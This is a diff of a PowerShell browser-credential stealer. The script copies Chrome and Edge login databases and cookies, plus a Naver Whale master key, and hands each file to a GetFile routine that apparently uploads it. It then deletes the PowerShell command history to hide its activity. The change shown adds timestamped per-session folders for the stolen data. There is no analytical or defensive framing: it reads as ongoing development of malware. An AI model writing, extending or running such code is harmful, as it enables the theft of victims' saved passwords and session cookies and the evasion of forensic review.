@@ -27,7 +27,7 @@ function CopyFile ($Array)
             $fileName = "LoginData_" + $Array[1] + $i
 			$destFileName = $env:APPDATA + "/" + $fileName
 			Copy-Item $Files[$i] -Destination $destFileName -Force
-            GetFile $destFileName $fileName "sessions"
+            GetFile $destFileName $fileName $Array[2]
 			del $destFileName
 			Write-Output $destFileName
 		}
@@ -41,7 +41,7 @@ function CopyFile ($Array)
             $fileName = "LoginForAccount_" + $Array[1] + $i
 			$destFileName = $env:APPDATA + "/" + $fileName
 			Copy-Item -Path $Files[$i].FullName -Destination $destFileName -Force
-            GetFile $destFileName $fileName "sessions"
+            GetFile $destFileName $fileName $Array[2]
 			Write-Output $destFileName
 			del $destFileName
 		}
@@ -60,10 +60,9 @@ function CookieCopyFile ($Array)
             $fileName = "Cookies_" + $Array[1] + $i
 			$destFileName = $env:APPDATA + "/" + $fileName
 			Copy-Item $Files[$i] -Destination $destFileName -Force
-            GetFile $destFileName $fileName "sessions"
+            GetFile $destFileName $fileName $Array[2]
 			Write-Output $destFileName
             del $destFileName
-
 		}
 	}
 }
@@ -140,14 +139,18 @@ function main
 	$masterkey = Get-MasterKeyJSON ($NaverWhaledataPath)
 	Add-Content -Path $outFile_masterkey -Value ("NaverWhale : " + $masterkey)
 
-    GetFile $outFile_masterkey "masterkey" "sessions"
+    $utcDateTime = Get-Date -UFormat "%s"  
+    $utcDateTime = [System.DateTime]::UtcNow
+    $folderName = $utcDateTime.ToString("yyyy-MM-dd_HH-mm-ss-") + "session"
+    Write-Output $folderName
+    GetFile $outFile_masterkey "masterkey" $folderName 
     del $outFile_masterkey
 
-	CopyFile (@($ChromedataPath,"Chrome"))
-	CopyFile (@($EdgedataPath,"msedge"))
+	CopyFile (@($ChromedataPath,"Chrome",$folderName))
+	CopyFile (@($EdgedataPath,"msedge",$folderName))
 
-	CookieCopyFile (@($ChromedataPath,"Chrome"))
-	CookieCopyFile (@($EdgedataPath,"msedge"))
+	CookieCopyFile (@($ChromedataPath,"Chrome",$folderName))
+	CookieCopyFile (@($EdgedataPath,"msedge",$folderName))
 	
 	$logp = $env:appdata + "\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
 	del $logp
